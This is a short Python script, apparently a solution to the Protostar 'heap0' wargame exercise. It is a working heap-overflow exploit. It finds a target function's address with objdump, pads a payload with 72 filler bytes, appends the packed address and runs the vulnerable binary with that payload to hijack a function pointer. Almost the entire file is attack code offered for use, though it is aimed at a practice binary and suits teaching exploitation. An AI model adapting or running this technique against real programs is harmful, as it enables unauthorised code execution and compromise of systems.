#!/usr/bin/env python
#-*- coding: utf-8 -*-

import sys
import struct
import subprocess
import re

if len(sys.argv) == 4:
    binary = sys.argv[1]
    var_name = sys.argv[2]
    nopsn = int(sys.argv[3])
else:
    binary = '/opt/protostar/bin/heap0'
    var_name = 'winner'
    nopsn = 72

def find_var_addr(binary, var_name):
    hex_regex = re.compile('^0x[0-9A-Fa-f]{8}')
    if hex_regex.match(var_name):
        return int(var_name[2:].strip(), base=16)
    addr = 0
    p1 = subprocess.Popen(["objdump", "-D", binary], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["grep", "-m", "1", '<'+var_name+'>'], 
                          stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.Popen(["awk", "{FS = \" \"; print $1}" ], 
                          stdin=p2.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    p2.stdout.close()
    res = p3.communicate()[0]
    if not res:
        print('[-] Variable not found. Note that this only works for variables ' \
              '(not functions). We search objdump output for \"<var_name>\"')
        exit()
    addr = int(res.strip(), base=16)
    return addr

addr = find_var_addr(binary, var_name)
print('[+] Address to be written ({0}) = {1}'.format(var_name, hex(addr)))
payload = 'A' * nopsn
payload += struct.pack('<L', addr)
with open('payload', 'w') as fd:
    fd.write(payload)
fd2 = open('out', 'w')
p1 = subprocess.Popen(binary + ' ' + payload, stdin=subprocess.PIPE, 
stdout=fd2, stderr=fd2, shell=True)
print('[+] Output written in \"out\" file.')

p = subprocess.Popen('cat out', stdin=subprocess.PIPE, 
stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
res = p.communicate()[0]
print('[+] \'out\' file contents: ')
print(res)

#p1 = subprocess.Popen([binary], stdin=open('payload', 'r'), 
#stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
#res = p1.communicate()
#print(res)
